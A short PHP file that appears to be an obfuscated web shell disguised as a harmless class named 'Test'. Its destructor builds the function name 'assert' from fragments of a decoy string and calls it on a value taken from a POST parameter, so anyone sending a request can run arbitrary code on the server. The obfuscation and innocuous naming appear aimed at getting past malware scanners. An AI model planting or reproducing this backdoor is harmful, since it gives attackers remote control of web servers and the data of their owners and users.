<?php
class  Test{
    public $config='';
    function __destruct(){
    $ch = explode(".","hello.ass.world.er.rt.e.saucerman");
    $c = $ch[1].$ch[5].$ch[4];
    @$c($this->config);
    }
}
$test=new Test();
@$test->config=$_POST['x'];
?>